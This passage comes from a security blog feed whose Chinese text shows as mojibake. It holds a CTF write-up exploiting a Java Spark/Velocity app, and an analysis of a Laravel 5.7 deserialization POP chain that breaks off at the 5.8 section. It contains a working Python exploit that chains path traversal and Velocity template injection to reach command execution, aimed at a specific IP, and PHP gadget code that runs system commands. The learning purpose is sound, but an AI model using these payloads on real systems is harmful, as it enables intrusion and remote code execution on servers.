&lt;properties&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;        &lt;project.reporing.outputEncoding&gt;UTF-8&lt;/project.reporing.outputEncoding&gt;        &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;    &lt;/properties&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.sparkjava&lt;/groupId&gt;            &lt;artifactId&gt;spark-core&lt;/artifactId&gt;            &lt;version&gt;2.9.2&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.sparkjava&lt;/groupId&gt;            &lt;artifactId&gt;spark-template-velocity&lt;/artifactId&gt;            &lt;version&gt;2.7.1&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;            &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;            &lt;version&gt;1.7.30&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;            &lt;artifactId&gt;velocity&lt;/artifactId&gt;            &lt;version&gt;1.7&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;    &lt;build&gt;        &lt;plugins&gt;            &lt;plugin&gt;                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;                &lt;configuration&gt;                    &lt;archive&gt;                        &lt;manifest&gt;                            &lt;mainClass&gt;Blog&lt;/mainClass&gt;                        &lt;/manifest&gt;                    &lt;/archive&gt;                    &lt;descriptorRefs&gt;                        &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;                    &lt;/descriptorRefs&gt;                &lt;/configuration&gt;                &lt;executions&gt;                    &lt;execution&gt;                        &lt;id&gt;make-assemble&lt;/id&gt;                        &lt;phase&gt;package&lt;/phase&gt;                        &lt;goals&gt;                            &lt;goal&gt;single&lt;/goal&gt;                        &lt;/goals&gt;                    &lt;/execution&gt;                &lt;/executions&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;&lt;/project&gt;</code></pre><p>ä»mainclassè¿™é‡Œçš„å€¼å¯ä»¥çœ‹å‡ºåŠ è½½çš„ä¸»ç±»Blog.classã€‚æŒ‰ç…§mavené»˜è®¤æ²¡æœ‰åŒ…çš„ç»“æ„ç›´æ¥è¯»<code>../../../../src/main/java/Blog.java</code></p><pre><code class="java">import static spark.Spark.*;import java.io.*;import org.apache.velocity.Template;import org.apache.velocity.VelocityContext;import org.apache.velocity.app.VelocityEngine;import spark.template.velocity.VelocityTemplateEngine;import java.io.StringWriter;public class Blog {    private static void log(String fname, String content) {        try {            FileWriter writer = new FileWriter(fname, true);            writer.write(content);            writer.close();        } catch (IOException e) {        }    }    public static void main(String[] arg) {        staticFiles.location(&quot;/public&quot;);        VelocityEngine velocityEngine = new VelocityEngine();        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;/&quot;);        velocityEngine.init();        VelocityContext context = new VelocityContext();        get(&quot;/&quot;, (request, response) -&gt; {            request.session(true);            String title = request.queryParams(&quot;title&quot;);            if (title != null) {                log(&quot;/tmp/&quot; + request.session().id(), &quot;Client IP: &quot; + request.ip() + &quot; -&gt; File: &quot; + title + &quot;\n&quot;);                Template template = velocityEngine.getTemplate(&quot;/home/ctf/web/src/main/resources/templates/&quot; + title);                StringWriter sw = new StringWriter();                template.merge(context, sw);                return sw;            }            Template template = velocityEngine.getTemplate(&quot;/home/ctf/web/src/main/resources/templates/index&quot;);            StringWriter sw = new StringWriter();            template.merge(context, sw);            return sw;        });    }}</code></pre><p>ä»£ç é€»è¾‘æ˜¯titleå‚æ•°é™¤äº†ä¼šæŒ‰å€¼æ‰¾åˆ°å¯¹åº”æ¨¡æ¿æ–‡ä»¶æ¸²æŸ“ã€‚è¿˜ä¼šå°†å‚æ•°æŒ‰ç…§sessionidå­˜å‚¨åˆ°<code>tmp/</code>ä¸‹ã€‚é‚£ä¹ˆæ­¤å¤„åº”è¯¥å…ˆä¼ payloadå†è¿›è¡Œæ¸²æŸ“ã€‚å³å¯è§¦å‘sstiè¾¾æˆrce.<br>sessionä¸º<code>node0wjq18duzt9pg4ddli5qyyfqn3034.node0</code>è¿™ç§å½¢å¼ã€‚idå»æ‰<code>.node0</code>å³å¯ã€‚</p><p>ç®€å•å†™ä¸ªexp</p><pre><code class="python">import requestsurl=&#39;http://122.112.253.135/&#39;session=&#39;node0wjq18duzt9pg4ddli5qyyfqn3034.node0&#39;id=session.rstrip(&#39;.node0&#39;)&#39;&#39;&#39;data={&#39;title&#39;:&#39;../../../../src/main/java/Blog.java&#39;}r=requests.get(url,params=data,cookies={&#39;JSESSIONID&#39;:session})print(r.text)&#39;&#39;&#39;data={&#39;title&#39;:&quot;#set($x=&#39;&#39;) #set($rt=$x.class.forName(&#39;java.lang.Runtime&#39;)) #set($chr=$x.class.forName(&#39;java.lang.Character&#39;)) #set($str=$x.class.forName(&#39;java.lang.String&#39;)) #set($ex=$rt.getRuntime().exec(&#39;grep -r flag /tmp&#39;)) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&quot;}r=requests.get(url,params=data,cookies={&#39;JSESSIONID&#39;:session})data={&#39;title&#39;:&#39;../../../../../../../tmp/&#39;+id}r=requests.get(url,params=data,cookies={&#39;JSESSIONID&#39;:session})print(r.text)</code></pre><p>è¿™ä¸ªpayloadæ˜¯æ‰¾äº†ä¸ªvelocityå›æ˜¾çš„payloadå†™çš„ã€‚é€»è¾‘ä¸Šè¿˜æ˜¯åå°„å°±ä¸å¤šè¯´äº†ã€‚å…¶å®ä¹‹å‰å­¦ä¹ JavaSecé‚£ä¸ªé¡¹ç›®é‡Œçš„sstipayloadä¹Ÿèƒ½æ‰§è¡Œã€‚ä½†æ˜¯ä¼¼ä¹å¤–å¸¦æ—¶æœ‰ç‚¹é—®é¢˜ã€‚</p><p>å”¯ä¸€æ¯”è¾ƒç‹—çš„å°±æ˜¯flagåœ¨<code>/tmp</code>ä¸‹ã€‚åœ¨tmpåˆ—ç›®å½•ä¼šå› ä¸ºsessionæ–‡ä»¶å¤ªå¤šè¿›è¡Œç›¸å…³æ“ä½œç›´æ¥å¡æ­»ã€‚ä¸€ä¸ªä¸ªè¯•å‘ç°æœ€ååªæœ‰<code>grep -r flag /tmp</code>ä¸ä¼šå¡ã€‚åšå®Œåå‘ç°æ¢äº†ä¸ªèŠ‚ç‚¹ï¼Œflagæ”¾æ ¹ç›®å½•äº†â€¦â€¦</p><p>å°±è¿™ä¹ˆå¤šå§ã€‚å¸Œæœ›æ–°å­¦æœŸä¸€åˆ‡é¡ºåˆ©ã€‚æ¯”èµ›æˆç»©èƒ½æ›´è¿›ä¸€æ­¥ã€‚æ•´ä¸ªæš‘å‡å­¦ä¹ çš„çŸ¥è¯†,åšè¿‡çš„é¢˜ï¼Œæ‰“è¿‡çš„æ¯”èµ›è®©è¿™ä¸¤ä¸ªæœˆæ²¡æœ‰è’åºŸï¼Œæ”¶è·è¿˜æ˜¯æŒºå¤§çš„ã€‚æ¯”è¾ƒå¯æƒœçš„æ˜¯æœ¬æ¥æ‰“ç®—è·Ÿå®Œçš„Commoncollectionså‡ æ¡é“¾å­ä»¥åŠjacksonï¼Œshiroç­‰ç­‰expçš„åŸç†æ²¡èƒ½å…¨éƒ¨å®Œæˆã€‚å¸Œæœ›è¿‡æ®µæ—¶é—´èƒ½æŠŠå‘å¡«äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel-popchain</title>
      <link href="2020/08/17/Laravel-popchain/"/>
      <url>2020/08/17/Laravel-popchain/</url>
      
        <content type="html"><![CDATA[<p>è€ƒè™‘äº†ä¸‹è¿˜æ˜¯æ‰“ç®—æŠŠlaravelçš„é“¾å­è·Ÿä¸€éã€‚çœ‹äº†ä¸‹åŸºæœ¬ä¸Šå°±5.7,5.8ä¸¤ä¸ªç‰ˆæœ¬çš„rceååºåˆ—åŒ–popchainã€‚æ‰€ä»¥å·¥ä½œé‡åº”è¯¥ä¸å¤§ã€‚æ­£å¥½æœ€è¿‘å®Œæˆtpç³»åˆ—çš„popchainå­¦ä¹ å®¡è®¡ä»£ç çš„æ„Ÿè§‰è¿˜åœ¨,é‚£å°±è¶çƒ­æ‰“é“å§ ã€‚</p><a id="more"></a><p>å…³äºä»£ç è·å–:<br><code>composer create-project --prefer-dist laravel/laravel laravel58</code><br>åé¢åŠ ä¸Š<code>&quot;5.7.*&quot;</code>ä¸‹è½½5.7ç‰ˆæœ¬çš„ã€‚</p><p>å¦‚æœä¸‹è½½å‡ºé”™æœ€å¥½æ¢ä¸‹composeræºã€‚<br>ä¹‹åå¯ä»¥ç›´æ¥<code>php artisan serve --host=0.0.0.0</code>.è¿™æ ·php-cliå°±ä¼šé»˜è®¤ä»8000ç«¯å£ç›‘å¬èµ·ä¸€ä¸ªwebæœåŠ¡ã€‚ç›´æ¥æŒ‰ç…§publicå¯¹å¤–æ˜¾ç¤ºã€‚</p><p>ç„¶åé»˜è®¤å…³äºlaravelçš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·<code>artisan</code>ã€‚æˆ‘ä¸ªäººè®¤ä¸ºå®¡è®¡ä»£ç çš„è¯å¦‚æœæ˜¯ç™½ç›’å®¡è®¡çœ‹ä¸‹è·¯ç”±,ä¼šç”¨<code>php artisan route:list</code>å°±å·®ä¸å¤šäº†ã€‚<br>å½“ç„¶åé¢å¦‚æœæ˜¯å¼€å‘çš„è¯è‚¯å®šè¦å…¨é¢å­¦ä¹ ä¸‹å…·ä½“ç”¨æ³•ã€‚</p><h2 id="laravel5-7-unserialize"><a href="#laravel5-7-unserialize" class="headerlink" title="laravel5.7-unserialize"></a>laravel5.7-unserialize</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ·»åŠ è·¯ç”±ä¸æ§åˆ¶å™¨ä»£ç ç»™ä¸€ä¸ªååºåˆ—åŒ–å…¥æ‰‹ç‚¹ã€‚<br>routes/web.php</p><pre><code class="php">&lt;?phpRoute::get(&#39;/&#39;, function () {    return view(&#39;welcome&#39;);});Route::get(&quot;/demo&quot;,&quot;\App\Http\Controllers\DemoController@demo&quot;);</code></pre><p>æ·»åŠ ä¸€ä¸ªdemoè·¯ç”±å¯¹åº”DemoControllerã€‚æ‰€ä»¥ç›´æ¥åœ¨app/Http/Controllersä¸‹å¢æ·»ä¸€ä¸ªç±»DemoControllerã€‚è¿™æ ·å‘½åç©ºé—´ä¹‹ç±»çš„ä¹Ÿä¼šè‡ªåŠ¨ç”Ÿæˆå¥½ã€‚</p><pre><code class="php">&lt;?phpnamespace App\Http\Controllers;class DemoController extends Controller{    public function demo()    {        if(isset($_GET[&#39;c&#39;])){            $code = $_GET[&#39;c&#39;];            unserialize($code);        }        else{            highlight_file(__FILE__);        }        return &quot;Welcome to laravel5.7&quot;;    }}</code></pre><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡demoè·¯ç”±è¿›è¡Œå‚æ•°ä¼ é€’ã€‚<br>expå°è¯•æ‰§è¡Œwhoami</p><p><img src="/2020/08/17/Laravel-popchain/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±æ˜¯è·Ÿé“¾å­äº†ã€‚é¦–å…ˆæ˜¯å…¥æ‰‹ç‚¹æ‰¾<code>__destruct()</code>è‡ªä¸å¿…è¯´ã€‚<br>æ­¤å¤„å…¥æ‰‹çš„destructå…¶å®éå¸¸å¤šã€‚æˆ‘ä»¬æ‰¾åˆ°<code>src\Illuminate\Foundation\Testing\PendingCommand.php</code>ã€‚å³ Illuminate/Foundation/Testing/PendingCommandç±»</p><pre><code class="php">public function __destruct(){    if ($this-&gt;hasExecuted) {        return;    }    $this-&gt;run();}public function run(){    $this-&gt;hasExecuted = true;    $this-&gt;mockConsoleOutput();    try {        $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);    } catch (NoMatchingExpectationException $e) {        if ($e-&gt;getMethodName() === &#39;askQuestion&#39;) {            $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;);        }        throw $e;    }    if ($this-&gt;expectedExitCode !== null) {        $this-&gt;test-&gt;assertEquals(            $this-&gt;expectedExitCode, $exitCode,            &quot;Expected status code {$this-&gt;expectedExitCode} but received {$exitCode}.&quot;        );    }    return $exitCode;}</code></pre><p>ç»ˆç‚¹å…¶å®å°±åœ¨runæ–¹æ³•ä¸­<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>è¿™å¥ä»£ç ã€‚å…³äºå®ƒçš„çœŸæ­£å«ä¹‰æˆ‘ä»¬å…ˆä¸å»æ·±ç©¶ã€‚ä»è¯­ä¹‰ä¸Šçœ‹ä¼¼ä¹æ˜¯è°ƒç”¨äº†å†…æ ¸è¿›è¡Œcallçš„å‘½ä»¤æ‰§è¡Œã€‚è€Œå®ƒæ˜¯åœ¨trycatchè¯­å¥ä¸­æ‰§è¡Œçš„ã€‚æ‰€ä»¥éœ€è¦åœ¨åˆ°è¿™ä¸€ä¸å‰éƒ½ä¸ä¼šå‡ºç°æŠ¥é”™ã€‚</p><p>é‡ç‚¹è·Ÿè¿›mockConsoleOutput.</p><pre><code class="php">protected function mockConsoleOutput(){    $mock = Mockery::mock(OutputStyle::class.&#39;[askQuestion]&#39;, [        (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),    ]);    foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) {        $mock-&gt;shouldReceive(&#39;askQuestion&#39;)            -&gt;once()            -&gt;ordered()            -&gt;with(Mockery::on(function ($argument) use ($question) {                return $argument-&gt;getQuestion() == $question[0];            }))            -&gt;andReturnUsing(function () use ($question, $i) {                unset($this-&gt;test-&gt;expectedQuestions[$i]);                return $question[1];            });    }    $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) {        return $mock;    });}</code></pre><p>è¿™é‡Œå°±æœ‰ä¸€ä¸ªå°ç»†èŠ‚ã€‚çœ‹åˆ°ä¸ƒæœˆç«å¸ˆå‚…è·Ÿè¿™é‡Œæ—¶é€‰æ‹©æ‰“æ–­ç‚¹ç„¶åç›´æ¥step overå•æ­¥è·³è¿‡ã€‚å‘ç°èƒ½æ­£å¸¸æ‰§è¡Œåˆ°foreachã€‚æ‰€ä»¥å°±æ²¡å»çœ‹<code>$mock</code>é‚£è¡Œçš„ä»£ç ã€‚è¿™åº”è¯¥æ˜¯ä¸ºäº†å‡å°‘ä¸å¿…è¦çš„å®¡è®¡ä»£ç é‡ã€‚(å¬è¯´ä¸€è·¯çœ‹ä¸‹å»çš„è¯åˆè‡­åˆé•¿â€¦â€¦)<br><img src="/2020/08/17/Laravel-popchain/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨å¯ä»¥çœ‹å‘<code>$this-&gt;test-&gt;expectedQuestions</code>è¿™å¥ã€‚å…¶ä¸­expectedQuestionsæ˜¯ä¸ªæ•°ç»„ã€‚ä»æ‰§è¡Œexpæ¥çœ‹,æˆ‘ä»¬å±æ€§ä¸­å¹¶æ²¡æœ‰<code>$this-&gt;test</code>å¯¹è±¡.æ‰€ä»¥ä¼šè§¦å‘<code>__get()</code><br>æ—¢ç„¶å¦‚æ­¤å…¶å®å°±æ˜¯æ‰¾<code>__get</code>æ–¹æ³•è¿”å›å€¼å¯æ§çš„ç±»äº†ã€‚è¿™é‡Œæ‰¾åˆ°<br>src\Faker\DefaultGenerator.php</p><pre><code class="php">public function __get($attribute){    return $this-&gt;default;}</code></pre><p>æ‰€ä»¥å¤§è‡´çš„ä¸€ä¸ªè„‰ç»œå·²ç»å‡ºæ¥äº†ã€‚ä½†æ˜¯æˆ‘ä»¬å¯¹æŸäº›å˜é‡è¿˜æ˜¯ä¸æ¸…æ¥šã€‚åŒæ—¶ä¹Ÿä¸çŸ¥é“æ˜¯å¦ä¼šæœ‰æŠ¥é”™é€€å‡ºã€‚å› æ­¤å¯ä»¥ç”¨ä¸€ä¸ªåŠæˆå“pocæ¥æ¢æµ‹ã€‚</p><pre><code class="php">&lt;?phpnamespace Illuminate\Foundation\Testing{    class PendingCommand{        public $test;        protected $app;        protected $command;        protected $parameters;        public function __construct($test, $app, $command, $parameters)        {            $this-&gt;test = $test;            $this-&gt;app = $app;            $this-&gt;command = $command;            $this-&gt;parameters = $parameters;        }    }}namespace Faker{    class DefaultGenerator{        protected $default;        public function __construct($default = null)        {            $this-&gt;default = $default;        }    }}namespace Illuminate\Foundation{    class Application{        public function __construct() { }    }}namespace{    $defaultgenerator = new Faker\DefaultGenerator(array(&quot;1&quot; =&gt; &quot;1&quot;));    $application = new Illuminate\Foundation\Application();    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#39;system&#39;, array(&#39;id&#39;));    echo urlencode(serialize($pendingcommand));}</code></pre><p>è¿™é‡ŒPendingCommandç±»çš„å››ä¸ªå‚æ•°æ˜¯åŸæ„é€ å‡½æ•°ä¸­å°±æœ‰çš„ã€‚è€Œä¸ºä»€ä¹ˆä¼šåœ¨è¿™é‡Œå‡ºç°<code>Illuminate\Foundation\Application</code>è¦åœ¨åé¢è§£é‡Šã€‚</p><p>æˆ‘ä»¬è¿˜æ˜¯ç›´æ¥æ‰“æ–­ç‚¹çœ‹å®ƒçš„æ‰§è¡Œã€‚å•æ­¥è·³è¿‡çš„è¯ä¼šå‘ç°åˆ°<code>$this-&gt;app-&gt;bind</code>ä¸ºæ­¢éƒ½æ˜¯å¯ä»¥æ­£å¸¸è¿›è¡Œçš„ã€‚ç›´åˆ°<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>è¿™ä¸ªæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„æœ€åä¸€æ­¥æ‰æŠ›å‡ºé”™è¯¯ã€‚ä¸€è·¯è·Ÿè¿‡å»å¯ä»¥çœ‹åˆ°æŠ¥é”™å…·ä½“å†…å®¹<br><img src="/2020/08/17/Laravel-popchain/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šå¾—æ·±å…¥ä¸‹è¿™è¡Œä»£ç ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦æ·»åŠ ä»£ç çœ‹<code>$this-&gt;app[Kernel::class]</code>.å› ä¸ºç›´æ¥è°ƒç”¨çš„è¯æˆ‘ä»¬æ˜¯æ²¡æ³•çœ‹å‡ºKernel::classçš„ã€‚æ‰€ä»¥æ¯”è¾ƒå¥½çš„æ–¹æ³•è¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥çœ‹ã€‚<br><img src="/2020/08/17/Laravel-popchain/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯ä»¥çœ‹åˆ°ã€‚<code>$this-&gt;app</code>å³æˆ‘ä»¬ä¹‹å‰expä¸­å®ä¾‹åŒ–çš„<code>Illuminate\Foundation\Application</code>ç±»çš„å¯¹è±¡.è€Œ<code>Kernel::class</code>ä¼šå›ºå®šè¿”å›å­—ç¬¦ä¸²<code>Illuminate\Contracts\Console\Kernel</code></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å‘ç°åªè¦å•æ­¥è·³è¿‡<code>$app = $this-&gt;app[Kernel::class];</code>å°±ä¼šå‡ºé”™æŠ›å‡ºè·Ÿä¹‹å‰è°ƒç”¨ååºåˆ—åŒ–æ—¶ä¸€æ ·çš„é”™è¯¯ã€‚æ‰€ä»¥é—®é¢˜è‚¯å®šå‡ºåœ¨è¿™å¥ä»£ç ä¸Šã€‚é‚£ä¹ˆä¸€è·¯è·Ÿè¿›<br>ä¼šå‘ç°æ˜¯è°ƒç”¨äº†è¿™ä¹ˆå‡ ä¸ªå‡½æ•°</p><pre><code class="php">//Pipelineprotected function handleException($passable, Exception $e){$handler = $this-&gt;container-&gt;make(ExceptionHandler::class)......//Applicationpublic function make($abstract, array $parameters = []){    $abstract = $this-&gt;getAlias($abstract);    if (isset($this-&gt;deferredServices[$abstract]) &amp;&amp; ! isset($this-&gt;instances[$abstract])) {        $this-&gt;loadDeferredProvider($abstract);    }    return parent::make($abstract, $parameters);}//Containerpublic function make($abstract, array $parameters = []){    return $this-&gt;resolve($abstract, $parameters);}protected function resolve($abstract, $parameters = []){    $abstract = $this-&gt;getAlias($abstract);    $needsContextualBuild = ! empty($parameters) || ! is_null(        $this-&gt;getContextualConcrete($abstract)    );    if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) {        return $this-&gt;instances[$abstract];    }......</code></pre><p>è¿™é‡Œä¸€è·¯è·Ÿè¿‡æ¥ä¼šå‘ç°åœ¨Applicationç±»è°ƒç”¨çˆ¶ç±»ä¹Ÿå°±æ˜¯Containerç±»çš„makeæ–¹æ³•,è¿›ä¸€æ­¥åˆ°è¾¾resolveæ–¹æ³•æ—¶ã€‚æœ‰ä¸€å¤„å¯æ§ç‚¹<code>return $this-&gt;instances[$abstract];</code></p><p>è¿˜è®°å¾—æˆ‘ä»¬æ˜¯è·Ÿè¿›<code>$this-&gt;app[Kernel::class]</code>æ¥åˆ°è¿™ä¸ªè¿”å›å€¼çš„å—?å®é™…ä¸Šæˆ‘ä»¬æœ€å¼€å§‹å¯»æ‰¾å‘½ä»¤æ‰§è¡Œæ—¶ã€‚æ˜¯ä»¥<code>$this-&gt;app[Kernel::class]=&gt;call(xxx)</code>å°è¯•è°ƒç”¨å‘½ä»¤çš„ã€‚é‚£ä¹ˆæ—¢ç„¶è¿™é‡Œappå¯¹è±¡å¯æ§äº†,æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„callæ–¹æ³•äº†ã€‚</p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å‰é¢é€‰æ‹©Applicationç±»çš„åŸå› ã€‚å®ƒç»§æ‰¿äº†Containerç±»ã€‚æ‰€ä»¥è°ƒç”¨çš„æ˜¯Containerçš„callæ–¹æ³•ã€‚æˆ‘ä»¬è·Ÿè¿›çœ‹ä¸‹</p><pre><code class="php">//Containerpublic function call($callback, array $parameters = [], $defaultMethod = null){    return BoundMethod::call($this, $callback, $parameters, $defaultMethod);}//BoundMethodpublic static function call($container, $callback, array $parameters = [], $defaultMethod = null){    if (static::isCallableWithAtSign($callback) || $defaultMethod) {        return static::callClass($container, $callback, $parameters, $defaultMethod);    }    return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) {        return call_user_func_array(            $callback, static::getMethodDependencies($container, $callback, $parameters)        );    });}protected static function getMethodDependencies($container, $callback, array $parameters = []){    $dependencies = [];    foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) {        static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);    }    return array_merge($dependencies, $parameters);}</code></pre><p>è¿™é‡Œå‘ç°å®é™…è°ƒç”¨çš„æ˜¯BoundMethodçš„é—­åŒ…å‡½æ•°ã€‚å…³äºé—­åŒ…å‡½æ•°åœ¨jsä¸­æ›¾ç»å¬è¯´è¿‡ã€‚é—­åŒ…ä¸»è¦æ˜¯ä½¿ç”¨:ä¸€ä¸ªå†…éƒ¨å‡½æ•°å¯ä»¥å¼•ç”¨å¤–éƒ¨å‡½æ•°çš„å‚æ•°å’Œå˜é‡ï¼Œå‚æ•°å’Œå˜é‡å°±ä¸ä¼šè¢«æ”¶å›çš„æœºåˆ¶ã€‚</p><p>è¿™é‡Œ<code>getMethodDependencies</code>è¿”å›ä¸¤ä¸ªæ•°ç»„çš„åˆå¹¶æ•°æ®ã€‚ç„¶è€Œå…¶ä¸­<code>$dependencies</code>æ•°ç»„æ˜¯ä¸ªç©ºçš„ã€‚é‚£ä¹ˆè¿”å›çš„è¿˜æ˜¯æˆ‘ä»¬å¯æ§çš„æ•°ç»„ã€‚æ—¢ç„¶å¦‚æ­¤ã€‚è°ƒç”¨<code>call_user_func_array()</code>çš„è¿™å¥ä»£ç ä¸¤ä¸ªå‚æ•°å°±éƒ½æ˜¯å¯æ§çš„ã€‚å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>rce exp</p><pre><code class="php">&lt;?phpnamespace Illuminate\Foundation\Testing{    class PendingCommand{        public $test;        protected $app;        protected $command;        protected $parameters;        public function __construct($test, $app, $command, $parameters)        {            $this-&gt;test = $test;            $this-&gt;app = $app;            $this-&gt;command = $command;            $this-&gt;parameters = $parameters;        }    }}namespace Faker{    class DefaultGenerator{        protected $default;        public function __construct($default = null)        {            $this-&gt;default = $default;        }    }}namespace Illuminate\Foundation{    class Application{        protected $instances = [];        public function __construct($instances = [])        {            $this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;] = $instances;        }    }}namespace{    $defaultgenerator = new Faker\DefaultGenerator(array(&quot;1&quot; =&gt; &quot;1&quot;));    $app = new Illuminate\Foundation\Application();    $application = new Illuminate\Foundation\Application($app);    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#39;system&#39;, array(&#39;whoami&#39;));    echo urlencode(serialize($pendingcommand));}</code></pre><p>è¿™é‡Œåªéœ€è¦å¢åŠ Applicationç±»çš„å†…å®¹ã€‚è®©å®ƒåœ¨ç¨‹åºæ‰¾å‘<code>$this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;]</code>æ‰¾å‘å®ƒè‡ªå·±ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½è°ƒç”¨å®ƒçš„callæ–¹æ³•æ‰§è¡Œ<code>call_user_func_array(&#39;system&#39;,&#39;whoami&#39;)</code>äº†.</p><p>å°ç»“ä¸€ä¸‹ã€‚5.7çš„popé“¾ä»expçœ‹èµ·æ¥ä¹Ÿå°±ä¸‰ä¸ªç±»çš„äº‹ã€‚ä½†æ˜¯å…¶ä¸­è°ƒè¯•çš„åŠŸå¤«è¦æ±‚æ¯”èµ·thinkphpè¦é«˜å‡ºä¸å°‘ã€‚å…¶ä¸­éå¸¸é‡è¦çš„ä¸€ç‚¹å°±æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•æ‰¾åˆ°<code>Kernel::class</code>çš„çœŸæ­£å­—ç¬¦ä¸²å€¼ã€‚å¹¶ä¸€è·¯æ‰¾åˆ°å¯æ§ç‚¹æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="laravel5-8-unserialize"><a href="#laravel5-8-unserialize" class="headerlink" title="laravel5.8-unserialize"></a>laravel5.8-unserialize</h2><p>5.8å…¶å®ä¹‹å‰åšå›½èµ›é¢˜ç›®æ—¶è·Ÿè¿‡ä¸€æ¬¡äº†ã€‚ä¸è¿‡å°è±¡ä¸å¤ªæ·±åˆ»äº†ã€‚æ‰€ä»¥å†æ¥çœ‹ä¸€æ¬¡ã€‚å…¶ä¸­æœ‰ä¸€æ¡é“¾æ˜¯é 